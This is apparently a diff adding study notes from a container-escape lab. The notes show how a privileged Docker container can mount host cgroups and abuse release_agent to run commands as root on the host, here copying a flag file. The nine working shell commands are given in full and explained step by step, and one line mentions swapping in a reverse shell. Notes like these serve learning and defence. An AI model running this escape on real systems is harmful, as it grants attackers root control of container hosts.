@@ -1,0 +1,53 @@
+User (Normal) mode
+  -talks directly to docker engine
+Privileged mode 
+  -talks directly to host computer OS
+
+Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root on the host.
+
+We can use a utility such as capsh which comes with the libcap2-bin package to list the capabilities our container has: capsh --print . Capabilities are used in Linux to assign specific permissions to a process. Listing the capabilities of the container is a good way to determine the syscalls that can be made and potential mechanisms for exploitation.
+
+capsh --print
+
+
+In the example exploit below, we are going to use the mount syscall (as allowed by the container's capabilities) to mount the host's control groups into the container.
+The code snippet below is based upon (but a modified) version of the Proof of Concept (PoC) created by Trailofbits, which details the inner workings of this exploit well.
+
+1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+2. echo 1 > /tmp/cgrp/x/notify_on_release
+
+3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+4. echo "$host_path/exploit" > /tmp/cgrp/release_agent
+
+5. echo '#!/bin/sh' > /exploit
+
+6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+
+7. chmod a+x /exploit
+
+8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+9. cat /flag.txt
+
+Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.
+
+-------------------------------------------------------------------------------------------------------------------------
+Explaining the Vulnerability
+
+1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we'll mount this to "/tmp/cgrp" on the container.
+
+2. For our exploit to execute, we'll need to tell the kernel to run our code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we're telling the kernel to execute something once the "cgroup" finishes. (Paul Menage., 2004).
+
+3. We find out where the container's files are stored on the host and store it as a variable.
+
+4. We then echo the location of the container's files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.
+
+5. Let's turn our exploit into a shell on the host
+
+6. Execute a command to echo the host flag into a file named "flag.txt" in the container once "/exploit" is executed.
+
+7. Make our exploit executable!
+
+8. We create a process and store that into "/tmp/cgrp/x/cgroup.procs". When the processs is released, the contents will be executed.
